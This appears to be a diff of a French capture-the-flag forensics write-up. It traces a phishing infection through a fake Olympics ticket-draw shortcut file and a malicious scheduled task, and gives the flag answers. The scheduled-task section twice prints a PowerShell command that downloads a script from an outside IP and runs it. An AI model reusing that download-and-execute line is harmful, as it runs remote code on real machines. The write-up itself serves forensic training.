@@ -63,11 +63,14 @@ Fichiers donnés :
 
 ### Informations trouvées grâce à ordi.png
 
-Information sur les processus en cours et malveillants 
-- Notepad : instructions.txt
-- Edge : Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf
+![Ordi.png](../Code_Source/Ordi.png)
 
-Permets d'avoir une idée de l'heure à laquelle l'attaque a eu lieu.
+`Ordi.png` est le screenshot de l'ordinateur infecté.
+Cette capture d'écran nous permet de récolter des informations précieuses sur la suite de notre investigation.
+
+- Notepad : instructions.txt
+- Edge : ../Downloads/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf
+- Autres applications de la taskbar
 
 ### Etude
 
@@ -79,26 +82,29 @@ MemProcFS.exe -forensic 1 -device dump.raw
 
 - **Quel est le nom du fichier malveillant ?**
 
-L'accès initial étant un mail de phishing, on regarde son système de fichiers pour voir s'il n'a pas téléchargé le fichier malveillant.
+L'accès initial étant un mail de phishing, on regarde son système de fichiers pour voir s'il n'a pas téléchargé le fichier malveillant, cette théorie est renforcé par le screenshot analysé plus haut.
 
-Visible dans `M:\forensic\ntfs\1\Users\clara\Downloads\`
+On regarde ainsi dans MemProcFS le dossier `M:\forensic\ntfs\1\Users\clara\Downloads\`
 On remarque qu'il a téléchargé *Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.zip*.
 
-Ce zip extrait le fichier `Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf` ayant pour type `raccourci`.
+Ce zip extrait le fichier `Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk` ayant pour type `raccourci`.
 
 Première partie du flag : `Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk`
 
 - **Quel est le nom de la scheduled task créée ?**
 
-On utilise le fichier visible dans `M:\forensic\csv\tasks.csv`. On va analyser dans timeline explorer (fichier .tle_sess)
+On va ainsi s'intéresser aux tâches planifiées. Dans MemProcFS, on regarde le fichier `M:\forensic\csv\tasks.csv` qui répertorie ces tâches.
 
-On voit la première task `IGotYourFileInfo` ayant pour ligne de commande `Invoke-WebRequest` et pour paramètre `-Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1`
+On voit la première `task` `IGotYourFileInfo` ayant pour ligne de commande `Invoke-WebRequest` et pour paramètre `-Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1`.
+Cette task parait malveillante tant bien dans son nom que dans ces paramètres.
 
 On vérifie dans `M:\forensic\csv\timeline_tasks.csv` que la task a été créée.
 
 Deuxième partie du flag : `IGotYourFileInfo`
 
 - **Quel script est lancé par cette scheduled task ?**
+
+On récupère dans `M:\forensic\csv\timeline_tasks.csv` le log de la création de la tâche planifiée :
 
 ````powershell
 IGotYourFileInfo - [Invoke-WebRequest :: -Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1] (Author)
